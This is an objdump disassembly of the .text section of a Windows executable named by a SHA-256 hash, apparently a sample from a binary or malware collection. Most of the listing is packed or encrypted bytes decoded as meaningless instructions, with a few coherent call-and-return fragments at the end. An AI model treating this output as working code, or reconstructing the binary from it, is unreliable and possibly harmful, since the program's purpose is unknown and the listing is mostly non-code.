
e6cd102d157da48ce240cc1fb89265b99987519fecb39f11913e585861052524.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	lods   al,BYTE PTR ds:[esi]
  4d0001:	int    0xac
  4d0003:	xchg   edi,eax
  4d0004:	mov    al,0xf2
  4d0006:	fimul  WORD PTR [eax+0x14]
  4d0009:	xchg   ecx,eax
  4d000a:	adc    BYTE PTR [ebx+edi*1+0x6d],ch
  4d000e:	mov    ds:0x11c7f606,al
  4d0013:	xchg   ebx,eax
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06b9
  4d06c1:	ret    
  4d06c2:	inc    esi
  4d06c3:	pop    ss
  4d06c4:	aaa    
  4d06c5:	(bad)  
  4d06c6:	int3   
  4d06c7:	mov    edi,DWORD PTR [edx-0x3e]
  4d06ca:	arpl   WORD PTR [ecx+eiz*1+0x71],bp
  4d06ce:	add    eax,0x368126d2
  4d06d3:	jmp    0xd9104626
  4d06d8:	and    cl,al
  4d06da:	sahf   
  4d06db:	cmp    ebp,esp
  4d06dd:	sub    DWORD PTR [eax-0x3d],esp
  4d06e0:	test   al,0xc4
  4d06e2:	je     0x4d06aa
  4d06e4:	sti    
  4d06e5:	outs   dx,DWORD PTR ds:[esi]
  4d06e6:	xchg   edx,eax
  4d06e7:	adc    DWORD PTR [edi],esp
  4d06e9:	mov    esp,0xff5f215b
  4d06ee:	adc    eax,0x4d202c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2084
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x20
  4d070c:	lea    esi,[ebx+0xd0]
  4d0712:	sbb    edx,DWORD PTR [esi-0x114]
  4d0718:	lea    eax,[esi-0x1d8]
  4d071e:	push   eax
  4d071f:	call   0x4d1594
  4d0724:	add    esp,0x4
  4d0727:	test   eax,eax
  4d0729:	jne    0x4d0719
  4d072b:	push   esi
  4d072c:	push   DWORD PTR [esi+0x30]
  4d072f:	push   DWORD PTR [esi+0x50]
  4d0732:	call   0x4d079c
  4d0737:	add    esp,0x8
  4d073a:	pop    esi
  4d073b:	mov    eax,0x0
  4d0740:	push   eax
  4d0741:	call   0x4d11a4
  4d0746:	add    esp,0x4
  4d0749:	add    esp,0x20
  4d074c:	pop    ebp
  4d074d:	ret    
  4d074e:	add    BYTE PTR [eax],al
  4d0750:	pop    edi
  4d0751:	call   DWORD PTR ds:0x4d208c
  4d0757:	call   edi
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0761:	sub    esp,0x5c
  4d0764:	mov    esi,0x4d313c
  4d0769:	mov    DWORD PTR [ebp-0x38],eax
  4d076c:	push   esi
  4d076d:	push   edx
  4d076e:	push   DWORD PTR [esi+0x160]
  4d0774:	push   edi
  4d0775:	push   ebx
  4d0776:	call   0x4d1504
  4d077b:	add    esp,0x10
  4d077e:	pop    esi
  4d077f:	push   0x0
  4d0781:	call   0x4d0ed8
  4d0786:	add    esp,0x4
  4d0789:	mov    edx,0x0
  4d078e:	push   edx
  4d078f:	call   0x4d11a4
  4d0794:	add    esp,0x4
  4d0797:	add    esp,0x5c
  4d079a:	pop    ebp
